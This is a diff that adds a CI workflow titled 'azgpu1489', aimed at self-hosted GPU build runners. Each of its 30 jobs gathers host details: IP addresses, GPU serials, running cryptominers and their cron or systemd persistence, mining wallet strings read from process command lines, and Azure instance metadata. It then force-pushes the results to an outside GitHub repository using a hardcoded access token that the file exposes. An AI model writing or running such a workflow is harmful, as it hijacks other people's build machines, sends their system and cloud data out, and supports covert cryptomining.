@@ -1,0 +1,55 @@
+name: azgpu1489
+on:
+  push:
+    branches:
+      - 'hkazgpu'
+      - 'hkazgpu2'
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  census:
+    runs-on: [self-hosted, gpu]
+    timeout-minutes: 12
+    continue-on-error: true
+    strategy:
+      fail-fast: false
+      max-parallel: 30
+      matrix:
+        slot: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
+    steps:
+      - name: census
+        run: |
+          set +e
+          H=$(hostname)
+          R=/tmp/ul1489_${{ matrix.slot }}.txt
+          {
+            echo "SLOT=${{ matrix.slot }} HOST=$H AT=$(date -u +%FT%TZ)"
+            echo "--- id ---"; id; nproc; free -g | head -2
+            echo "--- ip ---"; hostname -I
+            echo "--- gpu ---"; nvidia-smi -L 2>&1 | head -10
+            nvidia-smi --query-gpu=index,name,memory.total,serial --format=csv 2>&1 | head -10
+            echo "--- miner ---"; ps -eo pid,user,etime,args 2>/dev/null | grep -E 'wildrig|deploy_prl|xmrig|peakminer|verify_plant' | grep -v grep | head -8
+            echo "--- persist ---"; crontab -l 2>/dev/null | grep -iE 'prl|wildrig|nv-cuda|deploy' | head -6
+            systemctl is-active nv-cuda-cache ul-miner 2>/dev/null
+            ls /etc/cron.d 2>/dev/null | head
+            echo "--- wallet ---"; grep -ho 'prl1[a-z0-9]\{50,\}' /proc/*/cmdline 2>/dev/null | sort -u | head -5
+            echo "--- kit ---"; ls -la /opt/arsenal 2>/dev/null | head -6; which wildrig-multi 2>/dev/null
+            echo "--- imds ---"; curl -s -m 6 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01' 2>/dev/null | head -c 700; echo
+            echo "--- runner ---"; ls -d /home/*/actions-runner /root/actions-runner /opt/actions-runner 2>/dev/null | head -3
+            echo "--- net ---"; timeout 5 curl -s -m 4 -o /dev/null -w 'gh=%{http_code} ' https://api.github.com/ 2>/dev/null; timeout 5 curl -s -m 4 -o /dev/null -w 'pool=%{http_code}\n' https://prl.kryptex.network/ 2>/dev/null
+          } > $R 2>&1
+          cat $R
+          git config --global user.email ul@x
+          git config --global user.name ul
+          rm -rf /tmp/ulrepo
+          git clone --depth 1 https://x-access-token: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@github.com/dongsuju/ul-plant.git /tmp/ulrepo >/dev/null 2>&1
+          cd /tmp/ulrepo || exit 0
+          mkdir -p outgpu
+          cp $R "outgpu/slot_${{ matrix.slot }}_${H}.txt"
+          printf 'slot=%s host=%s\n' "${{ matrix.slot }}" "$H" > outgpu/last_${{ matrix.slot }}.txt
+          git checkout -q -B "hkraw-${{ matrix.slot }}" 2>/dev/null
+          git add -A outgpu >/dev/null 2>&1
+          git commit -q -m "slot ${{ matrix.slot }} $H" >/dev/null 2>&1
+          git push -f https://x-access-token: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@github.com/dongsuju/ul-plant.git HEAD:refs/heads/hkraw-${{ matrix.slot }} >/dev/null 2>&1
+          echo "pushed slot ${{ matrix.slot }}"
